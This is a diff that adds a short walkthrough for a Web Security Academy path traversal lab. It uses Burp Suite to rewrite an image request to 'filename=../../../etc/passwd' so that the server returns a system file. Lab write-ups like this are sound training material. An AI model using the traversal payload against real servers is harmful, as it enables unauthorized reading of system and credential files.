@@ -1,0 +1,13 @@
+//simple file path traversal 
+
+URL: 0a4000e40382c16d8041711e006e0037.web-security-academy.net make the URL to 0a4000e40382c16d8041711e006e0037.web-security-academy.net/image?filename=../../../etc/passwd
+
+Step1: Open burpsuite and capture the requests of the site, also capture the requests for product details 
+Step2: open http History and find the request where it is asking for the image of the product 
+Step3: Inspect the URL, send the GET request to repeater for further testing 
+Step4: change the file path FROM:
+                            GET /image?filename=32.jpg HTTP/2
+                            TO:  
+                            GET /image?filename=../../../etc/passwd HTTP/2
+Step5: Send the request and look for response status code 200 OK
+Step6: Congratulations!! you have solved this problem!!
